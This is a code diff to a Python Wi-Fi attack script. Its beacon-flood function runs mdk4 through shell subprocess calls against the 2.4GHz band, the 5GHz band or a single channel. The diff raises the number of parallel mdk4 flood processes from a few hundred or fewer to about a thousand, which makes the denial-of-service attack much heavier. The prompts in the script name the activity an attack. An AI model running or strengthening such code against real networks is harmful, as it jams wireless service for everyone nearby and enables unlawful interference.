@@ -47,7 +47,7 @@ def Beacon_Prompt():
 	149, 153, 157, 161, 165]				# UNII-3 (High Band)
 	bfType = input("Enter Target Channel for single channel flood, bg for 2.4GHz band flood, or a for 5GHz band flood: ")
 	if bfType.casefold() == "bg".casefold():
-		for chanIndex in range(220):
+		for chanIndex in range(990):
 			#subprocess.run(f"mdk4 wlan0 b -h > /dev/null &", shell=True, executable="/bin/bash")
 			subprocess.run(f"mdk4 wlan0 b -c {channel_list[chanIndex%11]} > /dev/null &", shell=True, executable="/bin/bash")
 		exit = input('Input anything to end attack: ')
@@ -55,7 +55,7 @@ def Beacon_Prompt():
 		print("Ended attack on 2.4GHz Band")
 		return False
 	if bfType.casefold() == "a".casefold():
-		for chanIndex in range(250):
+		for chanIndex in range(1000):
 			#subprocess.run(f"mdk4 wlan0 b -h > /dev/null &", shell=True, executable="/bin/bash")
 			subprocess.run(f"mdk4 wlan0 b -c {channel_list[11+chanIndex%25]} > /dev/null &", shell=True, executable="/bin/bash")
 		exit = input('Input anything to end attack: ')
@@ -65,7 +65,7 @@ def Beacon_Prompt():
 	try:
 		channel = int(bfType)
 		if channel in channel_list:
-			for i in range(50):
+			for i in range(1000):
 				subprocess.run(f"mdk4 wlan0 b -c {channel} > /dev/null &", shell=True, executable="/bin/bash")
 			exit = input('Input anything to end attack: ')
 			subprocess.run("pkill mdk4", shell=True, executable="/bin/bash")
